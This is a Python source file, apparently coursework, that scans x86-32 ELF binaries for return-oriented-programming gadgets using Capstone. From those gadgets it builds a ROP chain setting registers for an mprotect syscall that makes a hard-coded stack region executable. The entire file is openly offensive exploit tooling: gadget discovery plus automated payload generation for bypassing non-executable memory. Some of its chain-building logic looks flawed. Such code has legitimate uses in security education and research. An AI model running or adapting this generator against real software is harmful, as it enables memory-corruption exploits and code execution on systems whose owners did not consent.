from capstone import *
from copy import deepcopy
from elftools.elf.elffile import ELFFile

import argparse
import collections
import re
import sys
import struct

md = Cs(CS_ARCH_X86, CS_MODE_32)

# create a node, root, representing the ret instruction
# place root in the trie
# for pos from 1 to textseglen do:
#     if the byte at pos is c3 then:
#         callBuildFrom(pos, root)
# BuildFrom(indexpos, instruction parentinsn):
#     for step from 1 to max insnlen do:
#         ifbytes[(pos−step). . .(pos−1)] decode as a valid instruction insn then:
#             ensure insn is in the trie as a child of parent_insn
#             if insn isn’t boring then:
#                 callBuildFrom(pos−step, insn)


class Gadget:
    def __init__(self, mnemonic, op_str, start_addr, end_addr, code):
        self.mnemonic = mnemonic
        self.op_str = op_str
        self.start_addr = start_addr
        self.end_addr = end_addr
        self.code = code

    def __str__(self):
        return '0x%x -> 0x%x: %s %s' % (self.start_addr, self.end_addr, self.mnemonic, self.op_str)

    def quiet_str(self):
        return f'{self.mnemonic} {self.op_str}'


class TrieNode:
    def __init__(self, gadget, parent, depth):
        self.gadget = gadget
        self.children = {}
        self.parent = parent
        self.depth = depth


def insert(root, gadget, depth):
    gadget_node = TrieNode(gadget, root, depth)

    # if existing array of gadgets that share mnemonic then append
    if gadget.mnemonic in root.children:
        # print(
        #     f'gadget: {gadget.mnemonic} already in trie of {root.gadget.mnemonic}')
        root.children[gadget.mnemonic].append(gadget_node)
    else:
        # print(
        #     f'gadget: {gadget.mnemonic} inserted into trie of {root.gadget.mnemonic}')
        root.children[gadget.mnemonic] = [gadget_node]
    return gadget_node

def print_trie(root):
    print_trie_helper(root, [], 0)

def print_trie_helper(root, gadgets, depth):
    if(len(root.children.items()) == 0):
        # print backwards to show actual code sequence
        print(f'\n{gadgets[-1].start_addr:#0{10}x}', end=' : ')
        for i in range(1, len(gadgets) + 1):
            print(gadgets[-i].quiet_str(), end=' ; ')
        print('ret')
    else:
        for k, v in root.children.items():
            for node in v:
                gadgets.insert(depth, node.gadget)
                print_trie_helper(node, gadgets, depth + 1)
                gadgets.pop(depth)


bad_instructions = set(['ret', 'call', 'jg', 'jmp', 'ljmp', 'je', 'jne',
                        'jg', 'jge', 'ja', 'jae', 'jl', 'jle', 'jb', 'jbe',
                        'jo', 'jno', 'jz', 'jnz', 'js', 'jns', 'loop', 'loopcc'
                        ])


def populate_trie(root, code, text_section_start_addr):
    for pos in range(len(code)):
        # only way to extract single byte as bytestring, indexing just gives integer value
        curr_byte = bytes([code[pos]])
        if curr_byte == b'\xc3':
            build_from(root, code, pos, text_section_start_addr + pos, 0)


def build_from(parent_insn, code, pos, parent_instr_addr, depth):
    # max instr len (9) or however many bytes are left in file
    max_len = min(pos + 1, 10)
    for step in range(1, max_len):
        # where to start slice of bytes from
        start_index = pos - step

        disas_instruction = md.disasm(
            code[start_index: pos], parent_instr_addr - step, 1)

        for instruction in disas_instruction:  # to make it yield, only 1 element
            # only take instructions that use all the bytes
            if(instruction.size != pos - start_index):
                break
            # avoid things like call jmp
            if(instruction.mnemonic in bad_instructions):
                break

            gadget = Gadget(instruction.mnemonic, instruction.op_str,
                            instruction.address, parent_instr_addr, code[start_index: pos])

            gadget_node = insert(parent_insn, gadget, depth + 1)
            # recurse building gadgets from this node backwards, similar to how building gadgets from ret works
            build_from(gadget_node, code, start_index, instruction.address, depth + 1)

def test_trie():
    ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
    root = TrieNode(ret_gadget, None, 0)

    # code = b'\x55\x48\x8b\x05\xb8\x13\xc3\x90\x92\x27\xa3'
    # code = b"\x04\x04\x02\x02\xc3"
    # code = b"\x04\x04\x02\x02\xc3"
    # code = b"\x04\x04\x02\x02\xC3\x87\x12\xAA\xC3"
    # code = b"\x31\xC0\xC3\x40\xC3\xCD\x80\x58\x83\xC3\x15\xC3\x5B\x59\xC3\x5A\xB8\x0B\x00\x00\x00\xC3"
    code = b"\x53\x83\xEC\x08\xE8\xD3\xFC\xFF\xFF\x81\xC3\xB3\x2B\x00\x00\x83\xC4\x08\x5B\xC3"
    populate_trie(root, code, 0)
    print_trie(root)

def get_gadgets(binaries, offset):
    ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
    root = TrieNode(ret_gadget, None, 0)

    for binary in binaries:
        print('Processing file: ' + binary)
        with open(binary, 'rb') as f:
            # text_section_start_addr = hex(text_section['sh_addr'])
            parsed_elf = ELFFile(f)
            text_section = parsed_elf.get_section_by_name('.text')
            code = text_section.data()
            text_section_start_addr = text_section['sh_addr']
            # for i in md.disasm(code, text_section_start_addr):
            #     print(f'0x{i.address:x}:\t{i.mnemonic}\t{i.op_str}')
            populate_trie(root, code, text_section_start_addr + offset)

    return root

# Need to set:
# eax = 0x7D (125)
# ebx = Address of Memory to change (Must align to page boundary)
# ecx = Length of memory to change
# edx = 0x07
registers = {'eax': 0x7d, 'ebx': 0xbffdf000, 'ecx': 0x00021000, 'edx': 0x7}

# Regexes for useful instructions. Examples are given as comments
useful_instructions = ['inc (e\S+)', # inc eax 
                       'dec (e\S+)', # dec eax
                       'add (e\S+), (e\S+)', # add eax, ebx
                       'add (e\S+), (0[xX][\dA-Fa-f]+)', # add eax, 0x12341234
                       'sub (e\S+), (e\S+)', # sub eax, ebx
                       'sub (e\S+), (0[xX][\dA-Fa-f]+)', # sub eax, 0x12341234 
                       'shr (e\S+), (\d+)', # shr eax, 1
                       'shl (e\S+), (\d+)', # shl eax, 1
                       'mov (e\S+), (0[xX][\dA-Fa-f]+)', # mov eax, 0x12341234
                       'mov (e\S+), (e\S+)', # mov eax, ebx
                       'mov (e\S+), (\d+)', # mov eax, 0
                       'xor (e\S+), (e\S+)', # xor eax, eax
                       'pop (e\S+)', # pop ebx
                       'xchg (e\S+), (e\S+)'] # xchg eax, ebx

def process_node(node, curr_state):
    gadget_addr = node.gadget.start_addr
    instruction = node.gadget.mnemonic + ' ' + node.gadget.op_str

    temp = b'' 
    if node.gadget.mnemonic == 'pop':
        temp += struct.pack("<I", gadget_addr)
        
        if node.gadget.op_str in registers:
            if node.gadget.op_str == 'ebx' and curr_state['ebx'] != registers['ebx']:
                val = registers['ebx'] - 1 # Address must be end in 000, so subtract 1 to avoid null byte
                temp += struct.pack("<I", val)            
                curr_state['ebx'] = val

            elif node.gadget.op_str == 'ecx' and curr_state['ecx'] != registers['ecx']:
                val = registers['ecx'] ^ 0xFFFFFFFF
                temp += struct.pack("<I", val)
                curr_state['ecx'] = val 

            else:
                val = 0x12341234 # Junk for useless pop
                temp += struct.pack("<I", val)            
                curr_state[node.gadget.op_str] = val

        else:
            temp += struct.pack("<I", 0x12341234) # Add random junk for useless pop
    
    elif node.gadget.mnemonic == 'xor' and re.search('xor (e\S+), (e\S+)', instruction):
        reg1, reg2 = re.search('xor (e\S+), (e\S+)', instruction).groups()
        
        # Zero out one of eax, ebx, ecx, or edx
        if reg1 == reg2 and reg1 in registers and curr_state[reg1] != 0:
            temp += struct.pack("<I", gadget_addr)
            curr_state[reg1] = 0x0

    elif node.gadget.mnemonic == 'inc':
        # Inc one of eax, ebx, ecx, or edx
        if node.gadget.op_str in registers:
            if curr_state[node.gadget.op_str] < registers[node.gadget.op_str]:
                inc_count = registers[node.gadget.op_str] - curr_state[node.gadget.op_str]
                temp += struct.pack("<I", gadget_addr) * inc_count 
                curr_state[node.gadget.op_str] = registers[node.gadget.op_str]

    elif node.gadget.mnemonic == 'dec':
        # Dec one of eax, ebx, ecx, or edx
        if node.gadget.op_str in registers:
            if curr_state[node.gadget.op_str] > registers[node.gadget.op_str]:
                dec_count = curr_state[node.gadget.op_str] - registers[node.gadget.op_str]
                temp += struct.pack("<I", gadget_addr) * dec_count 
                curr_state[node.gadget.op_str] = registers[node.gadget.op_str]

    elif node.gadget.mnemonic == 'not':
        # Inc one of eax, ebx, ecx, or edx
        if node.gadget.op_str == 'ecx' and curr_state['ecx'] == (0x00021000 ^ 0xFFFFFFFF):
            temp += struct.pack("<I", gadget_addr)
            curr_state[node.gadget.op_str] = registers[node.gadget.op_str]

    elif node.gadget.mnemonic == 'mov' and re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction):
        reg, imm = re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction).groups()
        imm = int(imm, 16)

        if reg in registers and imm == registers[reg] and curr_state[reg] != registers[reg]:
            temp += struct.pack("<I", gadget_addr)
            curr_state[reg] = imm      

    return temp       

# Do a BFS on root to find useful gadgets
def create_payload(root):
    queue = collections.deque()
    queue.append(root)

    payload = b''
    temp = b''
    registers_state = {'eax': 0xffffffff, 'ebx': 0xffffffff, 'ecx': 0xffffffff, 'edx': 0xffffffff}
    curr_state = deepcopy(registers_state) # In case the remaining gadgets are bad

    while queue:
        if registers == registers_state:
            return payload

        node = queue.popleft()

        instr_payload = process_node(node, curr_state)
        curr_node = node
        while curr_node.parent != None:
            if temp != b'' and instr_payload == b'': 
                temp = b''
                curr_state = deepcopy(registers_state)
                break
            else:
                temp += instr_payload
                instr_payload = process_node(node, curr_state)
                curr_node = curr_node.parent

        if curr_node.parent == None:
            payload += temp
            registers_state = deepcopy(curr_state)
            temp = b''

            
        # Add the current node's children into the queue
        for mnemonic in node.children:
            for child in node.children[mnemonic]:
                queue.append(child)
        
    print('\nGenerated Payload:')
    return payload

def main():
    parser = argparse.ArgumentParser(description='Creates a ROP payload to execute mprotect()')
    parser.add_argument('--binary', nargs='+', type=str, required=True, help='Binary files to look for gadgets' )
    parser.add_argument('--offset', nargs='*', type=str, help='Offset for gadget addresses')
    parser.add_argument('--gadgets', action='store_true', help='Print gadgets')
    args = parser.parse_args()
    
    binaries = args.binary
    offset = 0
    if args.offset is not None:
        offset = int(args.offset.pop(), 16)

    root = get_gadgets(binaries, offset)
    if args.gadgets:
        print_trie(root)
    else:
        print(create_payload(root))

if __name__ == '__main__':
    main()   
